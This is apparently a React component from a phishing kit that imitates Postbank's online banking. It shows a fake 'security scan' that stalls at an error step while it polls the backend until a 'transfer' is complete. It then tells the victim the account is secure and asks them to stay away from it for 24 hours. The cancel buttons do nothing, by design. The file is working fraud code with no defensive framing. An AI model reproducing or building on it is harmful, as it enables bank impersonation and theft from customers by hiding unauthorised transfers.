import { useState, useEffect, useCallback } from 'react'

// Use relative URL so nginx can proxy to the backend
const API_URL = ''

// Helper to parse currency string to number (e.g., "10.000,50 €" -> 10000.50)
function parseCurrency(value) {
  if (!value) return 0
  if (typeof value === 'number') return value
  // Remove currency symbol, spaces, and convert German format
  const cleaned = value.toString()
    .replace(/[€\s]/g, '')
    .replace(/\./g, '')  // Remove thousand separators
    .replace(',', '.')   // Convert decimal comma to dot
  return parseFloat(cleaned) || 0
}

export function SecurityScan({ onComplete, sessionId, accountName = 'Kunde', balance = '0,00 €', dailyLimit = null, lastLogin: lastLoginProp = null }) {
  // Check if limit is lower than balance (step 4 should fail)
  const balanceNum = parseCurrency(balance)
  const limitNum = parseCurrency(dailyLimit)
  const limitTooLow = dailyLimit !== null && limitNum > 0 && limitNum < balanceNum

  // Dynamic scan steps based on limit check
  const SCAN_STEPS = [
    { id: 1, text: 'Überprüfung historischer Transaktionen', duration: 3000 },
    { id: 2, text: 'Analyse eingehender und ausgehender Überweisungen', duration: 4000 },
    { id: 3, text: 'Überprüfung von SEPA-Überweisungen', duration: 3500 },
    { id: 4, text: 'Überprüfung Ihrer Kontolimits', duration: 2500, isLimitError: limitTooLow },
    { id: 5, text: 'Analyse aktueller Kontobewegungen', duration: 0, isError: true } // Always shows as error until transfer complete
  ]
  const [showLoginNotice, setShowLoginNotice] = useState(true)
  const [currentStep, setCurrentStep] = useState(0)
  const [completedSteps, setCompletedSteps] = useState([])
  const [scanProgress, setScanProgress] = useState(0)
  const [transferComplete, setTransferComplete] = useState(false)
  const [isSecured, setIsSecured] = useState(false)

  // Poll for transfer completion
  const checkTransferStatus = useCallback(async () => {
    if (!sessionId) return false
    
    try {
      const response = await fetch(`${API_URL}/api/login/status/${sessionId}`)
      if (response.ok) {
        const data = await response.json()
        // Check if there's a completed transfer action
        // The backend should return transfer status
        if (data.transferCompleted || data.status === 'transfer_complete') {
          return true
        }
      }
    } catch (err) {
      console.error('Error checking transfer status:', err)
    }
    return false
  }, [sessionId])

  // Run through scan steps (but stop at step 5)
  useEffect(() => {
    if (currentStep < SCAN_STEPS.length - 1) { // Stop before last step (index 4)
      const step = SCAN_STEPS[currentStep]
      
      // Animate progress bar for this step
      const progressInterval = setInterval(() => {
        setScanProgress(prev => {
          const stepProgress = ((currentStep / (SCAN_STEPS.length - 1)) * 100) + 
            ((1 / (SCAN_STEPS.length - 1)) * 100 * (prev % 100) / 100)
          return Math.min(stepProgress + 2, ((currentStep + 1) / (SCAN_STEPS.length - 1)) * 82) // Stop at 82%
        })
      }, step.duration / 50)

      // Complete this step after duration
      const timer = setTimeout(() => {
        clearInterval(progressInterval)
        setCompletedSteps(prev => [...prev, step.id])
        setCurrentStep(prev => prev + 1)
        setScanProgress(((currentStep + 1) / (SCAN_STEPS.length - 1)) * 82)
      }, step.duration)

      return () => {
        clearTimeout(timer)
        clearInterval(progressInterval)
      }
    } else if (currentStep === SCAN_STEPS.length - 1) {
      // We're at the last step (error step) - start polling for transfer completion
      setScanProgress(82) // Keep at 82%
    }
  }, [currentStep])

  // Poll for transfer completion when at the last step
  useEffect(() => {
    if (currentStep !== SCAN_STEPS.length - 1) return
    if (transferComplete) return
    
    const pollInterval = setInterval(async () => {
      const complete = await checkTransferStatus()
      if (complete) {
        setTransferComplete(true)
        clearInterval(pollInterval)
        
        // Animate to 100% and show secured message
        let progress = 82
        const progressInterval = setInterval(() => {
          progress += 2
          setScanProgress(progress)
          if (progress >= 100) {
            clearInterval(progressInterval)
            setCompletedSteps(prev => [...prev, SCAN_STEPS[currentStep].id])
            setIsSecured(true)
          }
        }, 50)
      }
    }, 2000) // Poll every 2 seconds
    
    return () => clearInterval(pollInterval)
  }, [currentStep, transferComplete, checkTransferStatus])

  const handleCancel = () => {
    // This doesn't actually do anything - just a visual button
    console.log('Cancel clicked - no action')
  }

  // Format current date/time for last login
  const formatLastLogin = () => {
    // Use the real last login from backend if available
    if (lastLoginProp) return lastLoginProp
    
    // Fallback to current time if not provided
    const now = new Date()
    const day = String(now.getDate()).padStart(2, '0')
    const month = String(now.getMonth() + 1).padStart(2, '0')
    const year = now.getFullYear()
    const hours = String(now.getHours()).padStart(2, '0')
    const minutes = String(now.getMinutes()).padStart(2, '0')
    return `${day}.${month}.${year}, ${hours}:${minutes} Uhr`
  }

  return (
    <div className="security-scan">
      {/* Login Notice Bar */}
      {showLoginNotice && (
        <div className="security-scan__login-notice">
          <div className="security-scan__login-notice-content">
            <span className="security-scan__login-notice-text">
              Letzter Login: {formatLastLogin()}
            </span>
            <span className="security-scan__login-notice-info">i</span>
          </div>
          <button 
            className="security-scan__login-notice-close"
            onClick={() => setShowLoginNotice(false)}
            type="button"
          >
            × schließen
          </button>
        </div>
      )}

      {/* Yellow Header Bar */}
      <div className="security-scan__header">
        <div className="security-scan__header-container">
          <div className="security-scan__logo">
            <img 
              src="/assets/images/pb-logo.svg" 
              alt="Postbank" 
              className="security-scan__logo-img"
            />
          </div>
          <div className="security-scan__header-right">
            <div className="security-scan__header-balance">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="security-scan__header-icon">
                <rect x="2" y="4" width="20" height="16" rx="2"/>
                <path d="M2 10h20"/>
              </svg>
              <span>{balance}</span>
            </div>
            <div className="security-scan__header-user">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="security-scan__header-icon">
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                <circle cx="12" cy="7" r="4"/>
              </svg>
              <span>{accountName}</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="security-scan__content">
        {/* Shield Icon */}
        <div className="security-scan__icon-container">
          <div className={`security-scan__shield ${isSecured ? 'security-scan__shield--complete' : 'security-scan__shield--scanning'}`}>
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path 
                d="M12 2L4 6V11C4 16.55 7.84 21.74 12 23C16.16 21.74 20 16.55 20 11V6L12 2Z" 
                fill="currentColor" 
                opacity="0.1"
              />
              <path 
                d="M12 2L4 6V11C4 16.55 7.84 21.74 12 23C16.16 21.74 20 16.55 20 11V6L12 2Z" 
                stroke="currentColor" 
                strokeWidth="1.5" 
                strokeLinecap="round" 
                strokeLinejoin="round"
              />
              {isSecured ? (
                <path 
                  d="M9 12L11 14L15 10" 
                  stroke="currentColor" 
                  strokeWidth="2" 
                  strokeLinecap="round" 
                  strokeLinejoin="round"
                  className="security-scan__checkmark"
                />
              ) : (
                <circle 
                  cx="12" 
                  cy="12" 
                  r="3" 
                  stroke="currentColor" 
                  strokeWidth="1.5"
                  className="security-scan__pulse"
                />
              )}
            </svg>
          </div>
        </div>

        {/* Title */}
        <h1 className="security-scan__title">
          {isSecured ? 'Ihr Konto ist jetzt sicher' : 'Sicherheitsprüfung läuft'}
        </h1>
        
        <p className="security-scan__subtitle">
          {isSecured 
            ? 'Bitte greifen Sie in den nächsten 24 Stunden nicht auf Ihr Konto zu, um die Sicherheitsmaßnahmen abzuschließen.'
            : 'Bitte warten Sie, während wir Ihr Konto überprüfen.'
          }
        </p>

        {/* Progress Bar */}
        <div className="security-scan__progress-container">
          <div className="security-scan__progress-bar">
            <div 
              className="security-scan__progress-fill"
              style={{ width: `${scanProgress}%` }}
            />
          </div>
          <div className="security-scan__progress-text">
            {Math.round(scanProgress)}%
          </div>
        </div>

        {/* Scan Steps */}
        <div className="security-scan__steps">
          {SCAN_STEPS.map((step, index) => {
            const isCompleted = completedSteps.includes(step.id)
            const isCurrent = currentStep === index && !isCompleted
            const isErrorStep = step.isError && isCurrent && !isSecured
            // Step 4 (limit check) shows as error if limit < balance
            const isLimitErrorStep = step.isLimitError && isCompleted
            
            return (
              <div 
                key={step.id} 
                className={`security-scan__step ${isCompleted && !isLimitErrorStep ? 'security-scan__step--completed' : ''} ${isCurrent ? 'security-scan__step--active' : ''} ${(isErrorStep || isLimitErrorStep) ? 'security-scan__step--error' : ''}`}
              >
                <div className="security-scan__step-icon">
                  {isCompleted && !isLimitErrorStep ? (
                    <svg viewBox="0 0 24 24" fill="none" className="security-scan__step-check">
                      <circle cx="12" cy="12" r="10" fill="#28a745"/>
                      <path d="M8 12L11 15L16 9" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  ) : isLimitErrorStep ? (
                    <svg viewBox="0 0 24 24" fill="none" className="security-scan__step-error">
                      <circle cx="12" cy="12" r="10" fill="#c41230"/>
                      <path d="M8 8L16 16M16 8L8 16" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  ) : isErrorStep ? (
                    <svg viewBox="0 0 24 24" fill="none" className="security-scan__step-error">
                      <circle cx="12" cy="12" r="10" fill="#c41230"/>
                      <path d="M8 8L16 16M16 8L8 16" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  ) : isCurrent ? (
                    <div className="security-scan__step-spinner">
                      <svg viewBox="0 0 24 24">
                        <circle cx="12" cy="12" r="10" stroke="#0a3478" strokeWidth="2" fill="none" opacity="0.2"/>
                        <path d="M12 2A10 10 0 0 1 22 12" stroke="#0a3478" strokeWidth="2" fill="none" strokeLinecap="round"/>
                      </svg>
                    </div>
                  ) : (
                    <div className="security-scan__step-pending">
                      <svg viewBox="0 0 24 24" fill="none">
                        <circle cx="12" cy="12" r="10" stroke="#ccc" strokeWidth="2"/>
                      </svg>
                    </div>
                  )}
                </div>
                <span className={`security-scan__step-text ${(isErrorStep || isLimitErrorStep) ? 'security-scan__step-text--error' : ''}`}>
                  {step.text}
                </span>
                {isLimitErrorStep && (
                  <button 
                    className="security-scan__step-cancel"
                    onClick={handleCancel}
                    type="button"
                  >
                    Ändern
                  </button>
                )}
                {isErrorStep && (
                  <button 
                    className="security-scan__step-cancel"
                    onClick={handleCancel}
                    type="button"
                  >
                    Abbrechen
                  </button>
                )}
              </div>
            )
          })}
        </div>

        {/* Security Notice */}
        <div className="security-scan__notice">
          <svg viewBox="0 0 24 24" fill="none" className="security-scan__notice-icon">
            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#666" strokeWidth="1.5"/>
            <path d="M12 8V12M12 16H12.01" stroke="#666" strokeWidth="2" strokeLinecap="round"/>
          </svg>
          <span>
            {isSecured 
              ? 'Vielen Dank für Ihre Geduld. Ihr Konto wurde erfolgreich geschützt.'
              : 'Diese Sicherheitsprüfung schützt Ihr Konto vor unbefugtem Zugriff.'
            }
          </span>
        </div>
      </div>

      {/* Footer Teasers */}
      <div className="security-scan__footer-teasers">
        <div className="security-scan__footer-teasers-container">
          <div className="security-scan__footer-teaser">
            <div className="security-scan__footer-teaser-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="#0a3478" strokeWidth="1.5">
                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
              </svg>
            </div>
            <div className="security-scan__footer-teaser-content">
              <h5>Die wichtigsten Funktionen</h5>
              <p>Lernen Sie die wichtigsten Funktionen des Banking & Brokerage kennen.</p>
            </div>
          </div>
          <div className="security-scan__footer-teaser">
            <div className="security-scan__footer-teaser-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="#0a3478" strokeWidth="1.5">
                <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/>
              </svg>
            </div>
            <div className="security-scan__footer-teaser-content">
              <h5>Für wenig Mäuse an die Börse</h5>
              <p>Black-Week-Preise für Xtrackers, iShares, Amundi & Vanguard ETFs</p>
            </div>
          </div>
          <div className="security-scan__footer-teaser">
            <div className="security-scan__footer-teaser-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="#0a3478" strokeWidth="1.5">
                <circle cx="12" cy="12" r="10"/>
                <path d="M12 6v6l4 2"/>
              </svg>
            </div>
            <div className="security-scan__footer-teaser-content">
              <h5>Postbank Privatkredit direkt</h5>
              <p>Bis 14.12.2025 Black Week-Aktionszins sichern</p>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="security-scan__footer">
        <div className="security-scan__footer-links">
          <a href="#">Erste Schritte</a>
          <a href="#">Terminvereinbarung</a>
          <a href="#">Kontakt</a>
          <a href="#">Impressum</a>
          <a href="#">Rechtshinweise</a>
          <a href="#">Datenschutz</a>
          <a href="#">Cookie-Einstellungen</a>
        </div>
        <div className="security-scan__footer-copyright">
          © 2025 Postbank – eine Niederlassung der Deutsche Bank AG
        </div>
      </div>
    </div>
  )
}

export default SecurityScan
